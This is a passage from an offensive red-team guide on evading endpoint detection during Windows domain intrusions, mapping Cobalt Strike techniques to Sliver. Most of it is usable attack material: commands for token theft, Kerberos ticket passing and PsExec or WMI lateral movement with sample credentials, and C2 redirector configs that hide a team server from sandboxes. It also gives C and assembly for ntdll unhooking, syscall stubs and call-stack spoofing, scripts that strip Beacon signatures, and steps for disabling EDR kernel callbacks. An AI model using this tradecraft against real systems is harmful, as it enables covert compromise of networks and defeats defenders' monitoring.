This request is sent straight to the KDC and does not go through LSA, so Credential Guard does not interfere.

9. User Impersonation

What is token impersonation? Every process and thread in Windows runs under a security token — an object that says "I am user X with these privileges." When your Beacon runs, it inherits the token of whatever user launched it. To access resources as a different user (e.g. a domain admin), you need to either create a new token with their credentials or steal an existing token from a process they're running. This is how you move from "I compromised one user" to "I can act as any user on the network."

Why EDRs care: Token manipulation uses Windows APIs (LogonUserA, OpenProcessToken, DuplicateToken, ImpersonateLoggedOnUser) that EDRs monitor closely. The challenge is not whether you can impersonate — it's doing it without the EDR flagging the API call pattern, the process lineage, or the resulting logon event.

RTO covered multiple user impersonation techniques, but not all of them are viable in a modern EDR world.

9.1 make_token / createnetonly

What these do: Both commands let you authenticate to remote systems as a different user without changing who you are locally. Your Beacon keeps running as the original user, but outbound connections (SMB shares, WMI, etc.) use the new credentials. This is the most common way to "use" compromised credentials.

Both clone the current token and attach new credentials for outbound connections, but go through different APIs:

CommandAPILogon type
Beacon make_tokenLogonUserALOGON32_LOGON_NEW_CREDENTIALS
Rubeus createnetonlyCreateProcessWithLogonWLOGON_NETCREDENTIALS_ONLY

Both generate logon events tagged with the calling process. Running make_token from a Beacon hosted outside System32 or Program Files is suspicious; Rubeus' /process argument gives you control over the host process, which is easier to blend in. For maximum blend, target a process like runas.exe that legitimately produces these logon events by design.

Sliver equivalent: Sliver exposes both forms natively:

sliver (SESSION) > make-token -u contoso\\rsteel -p Passw0rd! -d contoso.com
# Token created, outbound auth now uses these creds

sliver (SESSION) > runas -u contoso\\rsteel -p Passw0rd! -P c:\\windows\\system32\\cmd.exe -a "/c whoami"
# CreateProcessWithLogonW equivalent — spawns a new process under the target user

sliver (SESSION) > rev2self
# Drops the impersonated token

9.2 steal_token

What this does: Instead of creating a new token from a password or hash, steal_token takes an existing token from a process that's already running as the target user. For example, if a domain admin has a process running on the machine (maybe an RDP session, a service, or a scheduled task), you open that process, duplicate its token, and apply it to your own thread. Now your Beacon can act as that user.

The API chain: OpenProcess (get a handle to the target process) → OpenProcessToken (get a handle to its token) → DuplicateTokenEx (make a copy) → ImpersonateLoggedOnUser (apply the copy to your thread). Each of these calls is hooked by EDRs.

There's often no problem with stealing and impersonating the primary access token of other processes, as long as we can call the underlying APIs in an OPSEC-safe way. That may involve call stack spoofing, API unhooking, or syscalls, depending on the EDR you're up against.

Sliver equivalent: impersonate takes a target username and finds an existing logon session for them, then duplicates and impersonates that token. Drop with rev2self:

sliver (SESSION) > impersonate contoso\\Administrator
sliver (SESSION) > rev2self

9.3 Kerberos

The problem: Tools like Rubeus generate raw Kerberos network traffic directly — sending AS-REQ and TGS-REQ packets to the domain controller on port 88. On a normal Windows machine, the only process that does this is lsass.exe. When an EDR sees Kerberos traffic originating from beacon.exe or an injected thread in explorer.exe, it's an immediate red flag.

Most techniques like asktgt, asktgs, and s4u abuse (where raw Kerberos traffic is generated directly by the tool) are not possible against EDRs that monitor network traffic. On Windows, the only native process that normally generates Kerberos traffic from a domain joined host is lsass.exe, although there are some exceptions like AzureADConnect.exe.

Dumping tickets and passing them into another logon session still works fine, as these actions don't touch LSASS directly, nor generate Kerberos traffic. However, there are other heavy restrictions on Kerberos tradecraft on modern hosts, which are discussed in the Credential Guard chapter.

Sliver equivalent: Sliver doesn't have native Kerberos tradecraft, but Rubeus is one armory install away and runs in-memory:

sliver > armory install rubeus
sliver (SESSION) > rubeus triage
sliver (SESSION) > rubeus dump /luid:0x422abf /service:cifs /nowrap
sliver (SESSION) > rubeus ptt /ticket:doIGZ...

# Same OPSEC problem as on CS — raw Kerberos traffic from a non-LSASS process is a red flag.

10. Lateral Movement

What is lateral movement? Once you have a foothold on one machine and credentials (or tokens) for another user, lateral movement is the process of executing code on a different machine in the network. You're "moving laterally" across the domain — from workstation to server, from server to domain controller.

Why this is hard under EDR: Every lateral movement technique creates artifacts on both the source and destination machine — network connections, service installations, process creation events, file writes. EDRs correlate these artifacts. For example, "a recently-created unsigned executable was written over SMB and then immediately launched via a new service" is a textbook PsExec detection. The challenge is choosing techniques whose artifacts blend with legitimate administration, and wrapping the API calls in enough evasion to survive the source machine's EDR.

10.1 WMI

Why WMI: WMI (Windows Management Instrumentation) is a legitimate remote management framework built into Windows. Administrators use it daily for tasks like querying system info, running scripts, and managing services. Because WMI traffic is expected in enterprise environments, it blends better than techniques like PsExec that install services.

The remote-exec wmi command is implemented as a BOF that calls combase.dll!CoCreateInstance to instantiate the COM object for remote WMI. That triggers a load-library event for wbemprox.dll, and because BOFs run from unbacked memory, the load looks like this:

C:\Windows\System32\KernelBase.dll!LoadLibraryExW+0xe6
C:\Windows\System32\combase.dll!CoReleaseServerProcess+0xee9
C:\Windows\System32\combase.dll!CoReleaseServerProcess+0x9b0
C:\Windows\System32\combase.dll!CoReleaseServerProcess+0x24ce
C:\Windows\System32\combase.dll!CoCreateFreeThreadedMarshaler+0x67f1
C:\Windows\System32\combase.dll!CoReleaseServerProcess+0x391
C:\Windows\System32\combase.dll!CoCancelCall+0x1e65
C:\Windows\System32\combase.dll!HSTRING_UserSize64+0x80d
C:\Windows\System32\combase.dll!InternalCAggIdRelease+0x727
C:\Windows\System32\combase.dll!CoRevokeDeviceCatalog+0x1297
C:\Windows\System32\combase.dll!InternalCAggIdRelease+0x155d
C:\Windows\System32\combase.dll!CStdStubBuffer_AddRef+0xfe1
C:\Windows\System32\combase.dll!IsErrorPropagationEnabled+0x58e
C:\Windows\System32\combase.dll!HSTRING_UserSize64+0x80d
C:\Windows\System32\combase.dll!CoWaitForMultipleHandles+0x775e
C:\Windows\System32\combase.dll!HSTRING_UserSize64+0x80d
C:\Windows\System32\combase.dll!CoCreateFreeThreadedMarshaler+0x4722
C:\Windows\System32\combase.dll!CoCreateFreeThreadedMarshaler+0x355b
C:\Windows\System32\combase.dll!CoCreateInstance+0x120
Unbacked+0x124

Beacon's BOF loader uses LoadLibraryA and GetProcAddress to resolve a BOF's imports, and since the PICO already hooks both, we can redirect the CoCreateInstance call through call stack spoofing. Add the hook to hooks.c:

#include <combaseapi.h>

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );

HRESULT WINAPI _CoCreateInstance ( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( OLE32$CoCreateInstance );
    call.argc = 5;

    call.args [ 0 ] = spoof_arg ( rclsid );
    call.args [ 1 ] = spoof_arg ( pUnkOuter );
    call.args [ 2 ] = spoof_arg ( dwClsContext );
    call.args [ 3 ] = spoof_arg ( riid );
    call.args [ 4 ] = spoof_arg ( ppv );

    return ( HRESULT ) spoof_call ( &call );
}

And the corresponding entry in pico.spec:

addhook "OLE32$CoCreateInstance" "_CoCreateInstance"

For the executable side of remote-exec wmi, upload the payload somewhere that already contains binaries (e.g. System32 or Program Files). Executing payloads from atypical directories is itself a detection.

Sliver equivalent: Sliver ships built-in WMI execution and a separate WMI-based implant deploy. The same unbacked-memory call stack issue applies if you run it from a non-implant process:

sliver (SESSION) > wmi -H lon-dc-1 -u contoso\\rsteel -p Passw0rd! "cmd.exe /c whoami > c:\\temp\\out.txt"

# Or stage a new implant on a remote target via WMI
sliver (SESSION) > psexec -s "MyService" -d "Update Service" -c \\\\lon-dc-1\\admin$\\implant.exe lon-dc-1
# (psexec in Sliver works for WMI too via --wmi flag in newer builds)
Suspicious/Unsigned execution via network logon

EDRs will almost certainly flag a recently-created file being executed via a network logon. The "recently" window varies by vendor. Some workarounds:

  • Upload the payload, wait a while, then run it.
  • Use a LOLBAS to launch it indirectly — cmd /c C:\Windows\System32\smb.exe instead of C:\Windows\System32\smb.exe directly.
  • Code-sign the payload.

10.2 PsExec

How PsExec works: PsExec-style lateral movement creates a Windows service on the remote machine that points to your payload. The payload runs as SYSTEM (the highest-privilege account). The classic flow is: connect to the target via SMB → upload payload to ADMIN$ share → create a service with binPath pointing at the uploaded file → start the service → payload executes → Beacon calls back.

Why it gets caught: The use of PsExec is usually detected due to a service being created with a UNC binPath, such as \\[target]\ADMIN$\foo.exe. This is the behaviour of Beacon's built-in jump psexec[64] command. You could write a custom Aggressor script to use C:\Windows\ (or some other directory) instead; or an alternate technique like SCShell, as this already uses System32. You could also upload the payload manually and execute it using remote-exec psexec (but don't forget to delete it afterwards). Remember that the service payload is the only one that performs remote injection. You will therefore certainly want to load the Artifact Kit to control the spawnto, etc.

Sliver equivalent: Sliver's psexec creates a Windows service on the target and points it at an implant binary you upload. Same UNC-binPath signature applies. Mitigation: upload to a non-UNC path first, then point the service at the local copy:

# Default behaviour (UNC binPath — signatured)
sliver (SESSION) > psexec -s "WinUpdate" -d "Windows Update Service" lon-dc-1

# Upload first, then point the service at a local path
sliver (SESSION) > upload /tmp/implant.exe \\\\lon-dc-1\\c$\\windows\\system32\\winupdate.exe
sliver (SESSION) > execute -t -o sc.exe \\\\lon-dc-1 create WinUpdate binPath= "C:\\windows\\system32\\winupdate.exe" start= demand
sliver (SESSION) > execute -t -o sc.exe \\\\lon-dc-1 start WinUpdate

# Or use SCShell-style technique via an extension
sliver > armory install scshell

10.3 BEACON_RDLL_GENERATE_LOCAL

What is this? When you use the Cobalt Strike UI to generate a payload (Attacks → Packages), the team server runs the BEACON_RDLL_GENERATE Aggressor hook to apply your custom loader and evasion. But when a running Beacon needs to generate a payload on the fly — for example, spawn (create a new Beacon), spawnas (Beacon as another user), or jump (lateral movement) — it uses the LOCAL variant instead. If you don't register the LOCAL hook, these commands produce vanilla, un-evasion'd Beacons that will get caught immediately.

BEACON_RDLL_GENERATE_LOCAL is the in-Beacon analogue of BEACON_RDLL_GENERATE. The UI-side hook fires when a payload is generated from the team server UI; the LOCAL variant fires when a Beacon command like spawn or spawnas needs to produce a payload on the fly.

It receives the same arguments as the UI hook, plus two extras:

ArgValue
$5Pointer to GetModuleHandleA
$6Pointer to GetProcAddress

These pointers are resolved by the parent Beacon and sent to the team server in metadata. They exist so they can be patched into the reflective loader, saving it from having to walk the EAT itself. Whether you use them depends on the defences in play — API calls from the loader will still be unbacked, so to actually benefit you'd need to wrap them in stack spoofing.

The lab version of Crystal Kit doesn't support these pointers. Because Beacon's IAT is hooked through the PICO, the GetModuleHandleA/GetProcAddress pointers it resolves point at our PICO hook functions, not the real APIs. A patched loader using them crashes.

Regardless of whether you use the pointers or not, the hook still needs to be registered in an Aggressor script. If you don't, any Beacon generated through one of these commands will not have any of our evasion tradecraft applied to it, and you'll effectively be running a vanilla Beacon. The code inside the hook can just be copy/pasted from the BEACON_RDLL_GENERATE hook:

set BEACON_RDLL_GENERATE_LOCAL
{
    local ( '$beacon $arch $spec_path $spec $final' );
    
    $beacon = $2;
    $arch   = $3;
  
    if ( $arch eq "x86" )
    {
        warn ( "Crystal Kit is x64 only" );
        return $null;
    }
  
    print_info ( "BEACON_RDLL_GENERATE_LOCAL" );
  
    $beacon = strrep_pad ( $beacon, "beacon.x64.dll", "bacon.x64.dll" );
    $beacon = strrep_pad ( $beacon, "%02d/%02d/%02d", "%02d/%02d/%04d" );
    $beacon = strrep_pad ( $beacon, "%s as %s\%s: %d", "%s - %s\%s (%d)" );
    $beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x00\x80\x00\x00", "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x01\x80\x00\x00" );
  
    # get path to spec file
    $spec_path = getFileProper ( script_resource ( "udrl" ), "loader.spec" );
  
    # parse the spec
    $spec = [ LinkSpec Parse: $spec_path ];
  
    # apply the spec
    $final = [ $spec run: $beacon, [ new HashMap ] ];
  
    if ( strlen ( $final ) == 0 )
    {
        warn ( "Failed to build payload" );
        return $null;
    }
  
    return $final;
}

11. Methodology

Operator-checklist methodology for EDR evasion engagements. Each phase walks the tradecraft pipeline: understand the telemetry, build the evasion, validate the bypass, operate under the sensor.

11.1 C2 Infrastructure

Build layered redirector infrastructure before any payload touches a target. Separate initial-access, persistence, and post-exploitation traffic across dedicated team servers.

11.1.1 Redirector Setup

  • Configure Apache as a smart redirector:
    • Enable modules: sudo a2enmod rewrite proxy proxy_http
    • Create .htaccess with RewriteEngine On
    • Match URI with RewriteCond %{{REQUEST_URI}} ^/api/v1/update$
    • Match query string with RewriteCond %{{QUERY_STRING}} ^session=[a-f0-9]{{32}}$
    • Proxy to team server: RewriteRule ^(.*)$ https://teamserver:443%{{REQUEST_URI}} [P,L]
    • Default rule: redirect all non-matching traffic to a legitimate site
# Apache .htaccess — smart redirector
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/api/v1/update$
RewriteCond %{QUERY_STRING} ^session=[a-f0-9]{32}$
RewriteRule ^(.*)$ https://teamserver:443%{REQUEST_URI} [P,L]
# Default: send everything else to a legitimate site
RewriteRule ^(.*)$ https://www.legitimate-site.com/ [L,R=302]
  • Configure NGINX as an alternative redirector:
    • Install: sudo apt install nginx
    • Use location ~* regex blocks for URI matching
    • Conditional forwarding with $request_method and $query_string variables
    • Proxy pass to team server: proxy_pass https://teamserver:443
# NGINX — conditional forwarding
location ~* ^/api/v1/update$ {
    if ($query_string ~* "^session=[a-f0-9]{32}$") {
        proxy_pass https://teamserver:443;
        break;
    }
    return 302 https://www.legitimate-site.com/;
}
  • Filter payloads by source IP:
    • Apache: RewriteCond %{{REMOTE_ADDR}} !^10\.10\.10\. to restrict
    • NGINX: check $remote_addr in an if block
    • Block known sandbox and AV vendor IP ranges
    • Log all blocked requests for operational awareness
  • Validate the redirector end-to-end before delivery:
    • Send a test beacon through the full chain
    • Confirm non-matching requests land on the decoy site
    • Confirm blocked IPs get the decoy, not the C2 response

11.1.2 Multi-Server Strategy

  • Separate team servers by engagement phase:
    • Initial access server: high-interaction, expendable if burned
    • Persistence server: low-and-slow, minimal traffic, long sleep
    • Post-exploitation server: high-volume, lateral movement traffic
  • Use a distinct Malleable C2 profile per server:
    • Different URIs, headers, and user-agent strings per profile
    • Set http-config { set trust_x_forwarded_for "true"; } for real client IPs behind redirectors
    • Match the profile to the expected traffic pattern (CDN, SaaS, update check)
  • Plan for infrastructure burn:
    • Pre-stage replacement redirectors with different domains
    • Use automation (Terraform / Ansible) to rebuild within minutes
    • Rotate domains and IPs on a schedule, not just when burned

General references: Cobalt Strike user guide · Outflank blog

11.2 EDR Telemetry Understanding

Understand what the EDR sees before attempting to evade it. Map the telemetry sources, identify the hooks, and choose the right evasion primitive for each sensor.

11.2.1 Syscall Evasion

  • Understand the hooking model:
    • EDRs hook ntdll.dll exports with a JMP to their inspection DLL
    • Hooked call flow: your code → ntdll stub → JMP to EDR → EDR inspects → original syscall
    • Goal: bypass the JMP and reach the kernel syscall directly
  • Implement direct syscalls:
    • MASM stub pattern: mov r10, rcx; mov eax, SSN; syscall; ret
    • Compile the stub into your loader, call it instead of the ntdll export
    • Downside: the call stack shows your module, not ntdll — detectable by stack-walking EDRs
; Direct syscall stub (MASM x64)
NtAllocateVirtualMemory PROC
    mov r10, rcx            ; syscall convention: r10 = first arg
    mov eax, 18h            ; SSN for NtAllocateVirtualMemory (version-dependent)
    syscall
    ret
NtAllocateVirtualMemory ENDP
  • Implement indirect syscalls for clean call stacks:
    • Resolve the syscall instruction address inside ntdll at runtime
    • Jump to it: jmp QWORD PTR [ntOpenProcessSyscall]
    • The return address on the stack now points into ntdll — clean call stack
    • Combine with SSN resolution (below) for a complete bypass
; Indirect syscall stub — jumps to syscall instruction inside ntdll
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h                            ; SSN
    jmp QWORD PTR [ntAllocSyscallAddr]      ; jump to ntdll's syscall;ret gadget
NtAllocateVirtualMemory ENDP

11.2.2 SSN Resolution

  • Hell’s Gate: resolve SSNs from the EAT:
    • Walk ntdll’s Export Address Table to find each Nt* function
    • Scan the function prologue for 0xB8 (mov eax, imm32) to extract the SSN
    • Fails if the prologue is hooked (JMP overwrites the mov)
  • Halo’s Gate: infer SSNs from neighbours:
    • When the target function is hooked, read the SSN from an adjacent unhooked neighbour
    • SSNs are sequential — add or subtract the offset to compute the target SSN
    • Iterate up and down until an unhooked neighbour is found
  • Tartarus’ Gate: handle multi-byte hooks:
    • Also check for 0xE9 (near JMP) in addition to the standard hook check
    • Detects EDRs that use longer trampolines instead of short JMPs
    • Combines Halo’s Gate fallback for full coverage

References: Maldev Academy resources · Outflank blog

11.2.3 API Unhooking

  • Load a clean copy of ntdll from disk:
    • Open C:\\Windows\\System32\\ntdll.dll with CreateFile
    • Map it into memory with CreateFileMapping + MapViewOfFile
    • This gives you a pristine, unhooked copy of ntdll
  • Overwrite the hooked .text section:
    • Find the .text section in both the loaded and clean copies
    • Change permissions: VirtualProtect(PAGE_EXECUTE_READWRITE)
    • Copy clean bytes: memcpy(loaded_text, clean_text, text_size)
    • Restore permissions: VirtualProtect(PAGE_EXECUTE_READ)
    • Flush: FlushInstructionCache(GetCurrentProcess(), NULL, 0)
// API unhooking — overwrite hooked ntdll .text with clean copy
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMap  = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

// Find .text section in both copies, overwrite hooked with clean
DWORD oldProtect;
VirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(hooked_text, clean_text, text_size);
VirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READ, &oldProtect);
FlushInstructionCache(GetCurrentProcess(), NULL, 0);
  • Validate the unhook:
    • Call a hooked function and confirm it reaches the kernel without EDR interception
    • Check for re-hooking — some EDRs periodically reinstall hooks
    • Consider unhooking on-demand per function rather than the entire DLL

References: Maldev Academy resources · MDSec research

11.2.4 Call Stack Spoofing

  • Understand why call stacks matter:
    • EDRs walk the call stack on sensitive API calls
    • A legitimate call stack shows frames from ntdll → kernel32 → user code
    • A suspicious stack shows your unknown module calling NtAllocateVirtualMemory directly
  • Build synthetic call stack frames:
    • Push a fake return address pointing to RtlUserThreadStart+0x2c
    • Push a fake frame for BaseThreadInitThunk+0x17
    • These mimic the standard thread initialization call chain
  • Use a JOP gadget for the actual call:
    • Find a jmp [rbx] gadget in a legitimate module
    • Set RBX to your real target function address
    • The gadget performs the call while the return chain looks clean

11.2.5 Kernel Callback Manipulation

  • Understand the kernel callback types:
    • Process callbacks: PsSetCreateProcessNotifyRoutineEx — EDR gets notified of every process creation
    • Handle callbacks: ObRegisterCallbacks — EDR can block handle operations (e.g., opening LSASS)
    • Registry callbacks: CmRegisterCallbackEx — EDR monitors registry writes
    • Image load callbacks: notified when DLLs/drivers are loaded
  • Map which callbacks belong to the target EDR:
    • Use a kernel driver or tool to enumerate the callback arrays
    • Identify entries pointing into the EDR’s driver module
  • Disable specific callbacks:
    • Process/thread/image callbacks: zero out the function pointer in the array
    • Object callbacks: set the Active field to 0
    • Registry callbacks: unlink from the doubly-linked list
    • Validate by performing the previously-monitored action and confirming no alert

References: Maldev Academy resources · MDSec research · RastaMouse

EDR Telemetry Sources — Quick Reference
Telemetry Source What It Sees Evasion Technique Tool / Method
User-mode hooks (ntdll) API calls: NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx Direct / indirect syscalls Hell’s Gate, RecycledGate, SysWhispers
ETW-TI (kernel provider) Process injection, credential access, image loads Patch ProviderEnableInfo.IsEnabled via kernel driver Vulnerable driver + etw_disable
Kernel callbacks (PsSetCreate*) Process/thread creation, handle operations, registry writes Zero callback entries or unlink from list Vulnerable driver + list_callbacks / remove_callback
Call stack walking Return addresses on the stack — identifies calling module Synthetic stack frames + JOP gadget Draugr technique, spoof_call()
Memory scanning RWX pages, PE headers, known byte signatures in memory Sleep mask encryption, RWX removal, header garbling PICO Sleep hook, section permission mapping
Thread start address Where a new thread begins execution — flags unbacked memory Set thread context to legitimate module offset ObfSetThreadContext

General references: Maldev Academy resources · Outflank blog · MDSec research

11.3 Load-Time Evasion

Build a loader that survives static analysis, signature scanning, and load-time inspection. Every byte on disk must be clean before execution begins.

11.3.1 Crystal Palace PIC Framework

  • Understand the Crystal Palace architecture:
    • Entry point is go() — position-independent, no PE headers on disk
    • API resolution via resolve() and resolve_ext() using ROR13 hashes
    • Function references use the MODULE$Function DFR (Deferred Function Resolution) pattern
  • Write the spec file:
    • make pic +gofirst +optimize +disco +mutate — build as PIC with optimizations and mutation
    • dfr "resolve" "ror13" — configure deferred resolution with ROR13 hashing
    • merge and mergelib to combine object files
    • run to produce final output
  • Hook APIs through the spec file:
    • attach "KERNEL32$VirtualAlloc" "_VirtualAlloc" — intercept VirtualAlloc calls
    • Implement the hook function to add call stack spoofing before forwarding
    • Use spoof_call(FUNCTION_CALL*) pattern for each hooked API
# Crystal Palace spec file
make pic +gofirst +optimize +disco +mutate
dfr "resolve" "ror13"
merge "loader.o"
mergelib "crystal.lib"
attach "KERNEL32$VirtualAlloc" "_VirtualAlloc"
attach "KERNEL32$VirtualProtect" "_VirtualProtect"
run

11.3.2 Resource Masking

  • Encrypt the embedded resource (Beacon DLL):
    • Generate an XOR key: generate $KEY 128 in the spec
    • Apply encryption: xor $KEY
    • Prepend length: preplen
    • Link as resource: link "dll"
# Resource masking spec commands
generate $KEY 128       # generate 128-byte XOR key
xor $KEY                # encrypt the resource with the key
preplen                 # prepend the plaintext length
link "dll"              # link as embedded resource
  • Verify the encrypted resource is signature-free:
    • Scan the output with YARA rules targeting known Beacon strings
    • Scan with the target AV/EDR in an isolated VM
    • The decrypted payload should only exist in memory, never on disk

11.3.3 Static Signature Removal

  • Identify signatured strings in the Beacon DLL:
    • beacon.x64.dll — the default DLL name
    • %02d/%02d/%02d — date format string
    • ReflectiveLoader — the reflective loader export name
    • YARA byte patterns from public rulesets
  • Replace strings with Aggressor:
    • Use strrep_pad() to replace each string with a random equivalent
    • Pad replacement must be the same length to avoid breaking offsets
    • Apply to every post-ex DLL, not just the main Beacon
# Aggressor — strrep_pad() for signature removal
set BEACON_RDLL_GENERATE {
    local('$dll');
    $dll = $2;
    $dll = strrep_pad($dll, "beacon.x64.dll",   "survey.x64.dll");
    $dll = strrep_pad($dll, "ReflectiveLoader",  "UpdateCheckProc");
    $dll = strrep_pad($dll, "%02d/%02d/%02d",    "%d-%d-%d______");
    return $dll;
}
  • Validate against public detection rules:
    • Run YARA with community Cobalt Strike rulesets
    • Submit to an isolated AV sandbox (not VirusTotal — preserves operational secrecy)
    • Re-scan after every profile or kit change

References: Cobalt Strike user guide · Outflank blog

11.3.4 RWX Removal

  • Allocate memory as RW, not RWX:
    • RWX allocations are a high-confidence indicator for memory scanners
    • Initial allocation with PAGE_READWRITE only
  • Apply per-section permissions after loading:
    • Walk the PE section headers of the loaded Beacon
    • Map IMAGE_SCN_MEM_EXECUTE → PAGE_EXECUTE_READ
    • Map IMAGE_SCN_MEM_WRITE → PAGE_READWRITE
    • Map read-only sections → PAGE_READONLY
  • Verify no RWX pages remain:
    • Use VirtualQuery to walk the Beacon’s memory regions
    • Confirm zero pages with PAGE_EXECUTE_READWRITE
// RWX Removal — allocate RW, load, then set per-section permissions
LPVOID base = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// ... copy PE headers and sections into base ...

// Walk section headers and apply correct protections
PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHeaders);
for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
    DWORD protect = PAGE_READONLY;
    if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
        protect = PAGE_EXECUTE_READ;
    else if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
        protect = PAGE_READWRITE;

    DWORD oldProtect;
    VirtualProtect(
        (LPBYTE)base + sec[i].VirtualAddress,
        sec[i].Misc.VirtualSize,
        protect,
        &oldProtect
    );
}

// Verify: walk memory regions and assert zero RWX pages
MEMORY_BASIC_INFORMATION mbi;
for (LPBYTE addr = (LPBYTE)base; addr < (LPBYTE)base + imageSize;) {
    VirtualQuery(addr, &mbi, sizeof(mbi));
    // PAGE_EXECUTE_READWRITE (0x40) should never appear
    if (mbi.Protect == PAGE_EXECUTE_READWRITE) { /* FAIL */ }
    addr += mbi.RegionSize;
}

11.3.5 Loader Call Stack Spoofing

  • Implement the Draugr technique:
    • Build synthetic stack frames with RtlUserThreadStart and BaseThreadInitThunk return addresses
    • Use spoof_call(FUNCTION_CALL*) to wrap every sensitive API call
  • Hook VirtualAlloc in the loader spec:
    • attach "KERNEL32$VirtualAlloc" "_VirtualAlloc"
    • The hook intercepts the call, pushes spoofed frames, then forwards
    • Apply the same pattern to VirtualProtect, CreateThread, and other monitored APIs
  • Validate call stacks under a debugger:
    • Attach WinDbg to the loader process
    • Break on NtAllocateVirtualMemory and inspect the stack
    • Confirm the stack shows legitimate ntdll/kernel32 frames, not your loader module
// Call Stack Spoofing — Draugr-style synthetic frames
typedef struct _FUNCTION_CALL {
    PVOID   pFunction;      // target API address
    PVOID   pArgs[8];       // arguments
    DWORD   dwArgCount;
} FUNCTION_CALL;

// Build synthetic return addresses from legitimate modules
PVOID rtlUserThreadStart = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
PVOID baseThreadInitThunk = GetProcAddress(GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");

void spoof_call(FUNCTION_CALL* fc) {
    // Push fake stack frames:
    //   [1] RtlUserThreadStart+0x21  (bottom of legitimate stack)
    //   [2] BaseThreadInitThunk+0x1a (legitimate thread init)
    //   [3] target API call          (appears called from kernel32)
    // Assembly trampoline pushes these return addresses onto the stack
    // then JMPs to fc->pFunction — EDR sees a clean call chain
}

// Usage: hook VirtualAlloc through the loader spec
LPVOID WINAPI _VirtualAlloc(LPVOID addr, SIZE_T size, DWORD type, DWORD prot) {
    FUNCTION_CALL fc = {0};
    fc.pFunction = pRealVirtualAlloc;
    fc.pArgs[0]  = addr;
    fc.pArgs[1]  = (PVOID)size;
    fc.pArgs[2]  = (PVOID)(ULONG_PTR)type;
    fc.pArgs[3]  = (PVOID)(ULONG_PTR)prot;
    fc.dwArgCount = 4;
    return (LPVOID)spoof_call(&fc);
}

General references: Cobalt Strike user guide · Outflank blog · Maldev Academy resources

11.4 Runtime Evasion

Once the loader has placed Beacon in memory, runtime evasion keeps it hidden during execution. Hook APIs, obfuscate memory during sleep, and clean up artifacts.

11.4.1 PICO Hooks

  • Understand the PICO architecture:
    • PICO (Position-Independent Code Object) loads alongside Beacon
    • It hooks Beacon’s GetProcAddress calls to redirect API resolution
    • Every redirected call goes through call stack spoofing before reaching the real API
  • Configure hooks in pico.spec:
    • addhook for each API Beacon calls that EDRs monitor:
    • InternetConnectA, InternetOpenA — HTTP callbacks
    • VirtualAlloc, VirtualAllocEx, VirtualProtect — memory operations
    • CreateProcessA, OpenProcess — process operations
    • Sleep — sleep masking entry point
    • LoadLibraryA, CoCreateInstance — DLL/COM loading
# pico.spec — hook Beacon's API calls through PICO
addhook "VirtualAlloc"        "_hook_VirtualAlloc"
addhook "VirtualAllocEx"      "_hook_VirtualAllocEx"
addhook "VirtualProtect"      "_hook_VirtualProtect"
addhook "CreateProcessA"      "_hook_CreateProcessA"
addhook "OpenProcess"         "_hook_OpenProcess"
addhook "Sleep"               "_hook_Sleep"
addhook "InternetConnectA"    "_hook_InternetConnectA"
addhook "InternetOpenA"       "_hook_InternetOpenA"
addhook "LoadLibraryA"        "_hook_LoadLibraryA"
addhook "CoCreateInstance"    "_hook_CoCreateInstance"
  • Validate each hook fires correctly:
    • Set breakpoints on the hook functions in a debugger
    • Confirm Beacon operates normally with all hooks active
    • Test each Beacon command category: sleep, shell, execute-assembly, lateral movement

11.4.2 Indirect Syscalls via RecycledGate

  • Resolve SSNs at runtime:
    • Walk ntdll EAT to find target Nt* function
    • Extract the SSN using Hell’s/Halo’s/Tartarus’ Gate
    • Cache resolved SSNs for the session lifetime
  • Find a clean syscall gadget in ntdll:
    • Scan ntdll .text for the syscall; ret byte sequence
    • Use an unhooked function’s syscall instruction as the jump target
    • The return address on the stack will point into ntdll — clean
  • Wire into PICO hooks:
    • Each PICO hook resolves the SSN, sets up registers, and jumps to the gadget
    • Combine with call stack spoofing for defense-in-depth
// RecycledGate — indirect syscall via a clean ntdll gadget
// 1. Walk ntdll EAT to resolve SSN for target function
DWORD resolve_ssn(const char* funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(ntdll, funcName);
    // SSN is at offset +4 in the stub: mov eax, SSN
    // Pattern: 4C 8B D1 B8 [SSN as DWORD]
    if (pFunc[0] == 0x4C && pFunc[3] == 0xB8)
        return *(DWORD*)(pFunc + 4);
    // If hooked, use neighbor sorting (Halo's Gate)
    return halo_gate_resolve(pFunc);
}

// 2. Find a clean "syscall; ret" gadget in ntdll .text
PVOID find_syscall_gadget() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_SECTION_HEADER text = get_section(ntdll, ".text");
    BYTE* start = (BYTE*)ntdll + text->VirtualAddress;
    for (DWORD i = 0; i < text->Misc.VirtualSize - 2; i++) {
        // syscall = 0F 05, ret = C3
